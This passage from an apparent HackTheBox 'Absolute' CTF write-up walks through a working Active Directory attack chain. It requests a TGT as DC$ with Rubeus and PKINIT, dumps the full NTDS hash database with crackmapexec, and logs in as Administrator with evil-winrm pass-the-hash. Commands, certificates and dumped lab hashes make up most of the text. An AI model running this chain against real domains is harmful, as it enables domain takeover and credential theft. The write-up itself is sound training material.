g04WmO9/WSgEz9wwGq8oaf1cfLWewK9XHD3vl+RJe2Nfp+lpyK22mmG+AAkXvz76Ki4tR0kqaA54Tdv4nD6lKOQA6LAXFuYdlXFmymMyMlcBhzR/RIJOZlwiWh2vplHtHReDTj9d4YCs7tLg71gN6HVCrqjzRm3VITViK+G3mKJdKLxVcVBZOoKVt/2lvh5JPL1VJbvNBAnNmmN8memhqQk6P/N7zo7Tvba0kgflrwEdNC1Cp7JTb9kTutMHdPL503Lz+cCSMVHF+vumqgZkaHpZ7p9gf3VWD+Ya62EqYq2IIvog8EJD+EfCsc+1bQby0hIxVfi19yU2hBrL6sjzrblSoN+Ov8pGq9snjr5t3KFdkZhjoNCnQwyPcPK4EcfjntZLMsCYpadmWRjNo3IerXOZgJMzWY1uUB312RIrCCc3TObT7mL/mHgO6hHzS0/w8t0h2qrttJCvefQt9s3JFNkh21wUaU5+OezQDmNu6E9Y1qc269vOspqGusmaq2xWUA5DXLDLTe2UvvTp76PHdOBcePv348LJZ/LJvKYIo5U/bIv4fr6Jakp6pwMoaUcskyy03RwZHXZEgr4TJsfFau5I5PapRjDaxHe0dl8IX4xTIPIBnxRCShvujulImNoPcENholI1SMFOpdidJLe6hqPKSpyeeVL3VlZE4E6Nxv+k0y1EM+T2gFj2/DN5MejTRfXryAxJVz052ZAME2hUuvF3guB/4lrmaP+NOELmdO3eTkNLTt8WBoeYcwJa1LFiC/yWjk/by29c9J1oJWkUHO0cbYu487UWuCLXQ+4uHEd0tca5ktSEKKYwFY2rBk3TaJTv/zafMj2KoDcH9SRll7/lA+lpreCCua4XFH3TT8KvVtDf/xPJOTWCCuR3VeBmjUW9TJrt7ZD99EC3dbt61xxr5bT8TkU9AJC/2r3sKf+0AuZ6YvoU/O1MbNLY+xnhY004JzJYxbPCyHpTA7MB8wBwYFKw4DAhoEFF2Y4iwuudVgRdjnSPCCBiwip2VfBBTbscKO7WDpZFdiqubtPC/m4qVGowICB9A= -cep xH6@eZ6-eJ7@
*Evil-WinRM* PS C:\users\winrm_user\documents> 
```

What this command does is use a CLSID in order to first add a new msDS-KeyCredentialLink, which would generate another certificate for us similar to `pywhisker`. Afterwards, we can use this certificate to request a TGT as `DC$` and get the NTLM hash:

```zsh
*Evil-WinRM* PS C:\users\winrm_user\documents> .\rubeus.exe asktgt /user:DC$ /certificate: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 /passw

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[*] Using domain controller: fe80::a801:1d59:2aca:891e%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      Lmh0Yg==

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  5/21/2023 7:17:48 PM
  EndTime                  :  5/22/2023 5:17:48 AM
  RenewTill                :  5/28/2023 7:17:48 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  mLTt6Vxq+JDT6frLDubHkg==
  ASREP (key)              :  79935450188D60EF15C12D3A2422A3C1

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
*Evil-WinRM* PS C:\users\winrm_user\documents> 
```

Pefetc!! Now we have the hash `NTLMv2` of the machine!! 
Now we can use `crackmapexec` with this hash to dump the credentials: 

```zsh
❯ cme smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)
SMB         absolute.htb    445    DC               [+] c-ip\DC$:A7864AB463177ACB9AEC553F18F42577 
SMB         absolute.htb    445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         absolute.htb    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         absolute.htb    445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
SMB         absolute.htb    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         absolute.htb    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         absolute.htb    445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         absolute.htb    445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         absolute.htb    445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         absolute.htb    445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         absolute.htb    445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         absolute.htb    445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         absolute.htb    445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         absolute.htb    445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
SMB         absolute.htb    445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         absolute.htb    445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         absolute.htb    445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         absolute.htb    445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         absolute.htb    445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         absolute.htb    445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:7a42e5731c1f2bb9cc4e1ca81db746a8:::
SMB         absolute.htb    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
SMB         absolute.htb    445    DC               [+] Dumped 18 NTDS hashes to /root/.cme/logs/DC_absolute.htb_2023-05-22_043131.ntds of which 17 were added to the database
```

GREAAAT!! We have administrator's hash!!! Incredible!!! Now, we can connect via `evil-winrm` and capture the flag:

```zsh
❯ evil-winrm -i 10.10.11.181 -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f******************************5
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
GREAT!! Rooted machine!!

![](/assets/img/absolute/7.png)

## Conclusions

- - -

Withour any doubt, this was my favourite machine of all. I love `Active Directory`, and this machine was **always** `Active Directory`.
I hope `HackTheBox` release more machines like this, but in the meantime, I'll have to wait and pwn the other ones. 
I hope you learned **a lot** with this machine, as always it's me, Ruycr4ft. Take care!
